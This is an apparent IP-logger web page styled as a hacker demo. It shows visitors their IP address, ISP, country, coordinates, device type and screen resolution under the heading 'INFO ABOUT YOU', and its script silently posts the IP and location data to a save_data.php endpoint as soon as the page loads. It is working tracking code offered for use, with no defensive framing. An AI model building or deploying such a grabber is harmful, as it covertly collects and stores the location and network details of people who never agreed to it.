<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            display: flex;
            flex-direction: column; 
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-image: url('https://avatars.githubusercontent.com/u/75953873?v=4');
            height: 100vh;
            margin: 0;
            background-color: transparent;
            color: rgb(4, 203, 40);
        }

        .black-card {
            background-color: black;
            color: rgb(118, 155, 155);
            padding: 10px;
            z-index: 1000;
            text-align: center;
            background-color: rgb(23, 27, 27);
            border-radius: 10px; 
            box-shadow: 0 0 10px 3px #06da97; 
        }
        
        h1 {
            margin-top: 0; 
            font-size: 80px; 
            font-weight: 700;
            text-align: center;
            line-height: 1.2;
            color: #fff;
            text-shadow: 0 0 15px #06da97; 
            letter-spacing: 5px;
            z-index: 1;
            position: relative;
        }

    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div class="black-card">
    <h2>INFO ABOUT YOU:</h2>

    <form id="dataForm" action="save_data.php" method="post">


        <p><strong>IPv4 Address:</strong> <span id="ipv4Address"></span></p>
        <input type="hidden" name="ipv4Address" id="ipv4Address">

        <p><strong>Device:</strong> <span id="deviceInfo"></span></p>
        <input type="hidden" name="deviceInfo" id="deviceInfo">

        <p><strong>Screen Resolution:</strong> <span id="resolutionInfo"></span></p>
        <input type="hidden" name="resolutionInfo" id="resolutionInfo">

        <p><strong>Country Name:</strong> <span id="country_name"></span></p>
        <input type="hidden" name="country_name" id="country_name">

        <p><strong>ISP:</strong> <span id="isp"></span></p>
        <input type="hidden" name="isp" id="isp">

        <p><strong>Latitude:</strong> <span id="latitude"></span></p>
        <input type="hidden" name="latitude" id="latitude">

        <p><strong>Longitude:</strong> <span id="longitude"></span></p>
        <input type="hidden" name="longitude" id="longitude">

    </form>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
<script>

        function detectDevice() {
            var userAgent = navigator.userAgent.toLowerCase();

            if (userAgent.includes("mobile")) {
                return "Smartphone";
            } else if (userAgent.includes("tablet")) {
                return "Tablet";
            } else {
                return "Laptop or Desktop";
            }
        }

        var deviceType = detectDevice();
        document.getElementById("deviceInfo").textContent = deviceType;

        var screenWidth = window.screen.width;
        var screenHeight = window.screen.height;
        document.getElementById("resolutionInfo").textContent = screenWidth + "x" + screenHeight;
        
        $(document).ready(function () {

        $.getJSON("https://ipapi.co/json/", function (data) {
            $("#ipv4Address").text(data.ip);
            $("#country_name").text(data.country_name);
            $("#isp").text(data.org);
            $("#latitude").text(data.latitude);
            $("#longitude").text(data.longitude);

        $.ajax({
            type: "POST",
            url: "save_data.php",
            data: {
                ipv4Address: data.ip,
                country_name: data.country_name,
                isp: data.org,
                latitude: data.latitude,
                longitude: data.longitude
            },
        });
    });

    $.get("https://ipv4.icanhazip.com", function (ipv4Address) {
        $("#ipv4Address").text(ipv4Address);
    });

    $("#user_agent").text(navigator.userAgent);
});

        
</script>
</body>
</html>
